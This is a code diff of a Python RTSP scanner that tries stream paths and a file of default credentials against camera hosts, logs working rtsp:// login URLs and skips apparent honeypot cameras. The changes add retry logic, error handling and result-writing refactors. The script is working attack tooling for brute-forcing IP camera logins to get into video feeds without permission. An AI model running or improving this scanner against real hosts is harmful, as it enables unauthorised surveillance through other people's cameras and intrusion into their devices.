@@ -6,7 +6,6 @@ import socket as so
 from time import sleep
 
 from fire import Fire
-from tqdm import tqdm
 
 from lib.utils import tim
 
@@ -14,7 +13,12 @@ from lib.utils import tim
 status_re = re.compile(r'RTSP/\d\.\d (\d\d\d)')
 
 
-def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 10):
+def wrire_result(res):
+    with open('./local/rtsp.txt', 'a') as f:
+        f.write(f'[{tim()}] {res}\n')
+
+
+def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout: float = 5):
     if cred:
         cred += '@'
     req = (
@@ -22,6 +26,7 @@ def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout
         'CSeq: 2\r\n'
         '\r\n'
     )
+    tries = 5
     while True:
         try:
             with so.socket() as s:
@@ -31,16 +36,28 @@ def rtsp_req(host: str, port: int = 554, path: str = '', cred: str = '', timeout
                 response = s.recv(1024).decode()
                 return int(status_re.findall(response)[0])
         except so.timeout:
-            return 503
+            return 503  # slowpoke, 3ff0ff
         except IOError as e:
-            if e.errno in [104, 111]:
+            # 104 reset by peer
+            # 111 refused
+            if e.errno == 111:
                 return 503
+            if e.errno == 104:
+                if tries <= 0:
+                    # print('u', end='', flush=True)
+                    return 503  # host f*ckup?
+                sleep(1 / tries)
+                tries -= 1
+                continue
             print(e)
-            sleep(0.25)
+            sleep(0.25)  # potential  too many open files
         except KeyboardInterrupt:
             raise
-        except:
+        except IndexError:
             return 503
+        except Exception as e:
+            print('Unknown error:', e, 'please, contact with dev')
+            return 418
 
 
 def check_cred(host, port, path, cred):
@@ -49,17 +66,22 @@ def check_cred(host, port, path, cred):
         print('+', end='', flush=True)
         return f'rtsp://{cred}@{host}:{port}{path}'
 
-    if code == 503:
-        print('e', end='', flush=True)
+    if code >= 500:
+        print('-', end='', flush=True)
         return
 
-    print('.', end='', flush=True)
+    # print('.', end='', flush=True)
     return ''
 
 
 def check_path(host, port, path):
-    if rtsp_req(host, port, path) not in [200, 401, 403]:
+    code = rtsp_req(host, port, path)
+    if code >= 500:
+        print('-', end='', flush=True)
         return
+    if code not in [200, 401, 403]:
+        print('.', end='', flush=True)
+        return ''
 
     with open('./data/rtsp_creds.txt') as f:
         creds = [ln.rstrip() for ln in f]
@@ -86,9 +108,10 @@ def check_host(host):
                 return
             if rr:
                 if '0h84d' in rr:
+                    print('f', end='', flush=True)  # fake cam
                     return
-                with open('./local/rtsp.txt', 'a') as f:
-                    f.write(f'[{tim()}] {rr}\n')
+
+                wrire_result(rr)
                 print('@', end='', flush=True)
                 return rr  # first valid path is enough now
 
@@ -102,9 +125,7 @@ def main():
         for i, res in enumerate(list(results)):
             if res:
                 print()
-                print(f'[+ {i}]')
-                for url in res:
-                    print(url)
+                print(f'[+ {i}]', res)
 
 
 if __name__ == "__main__":
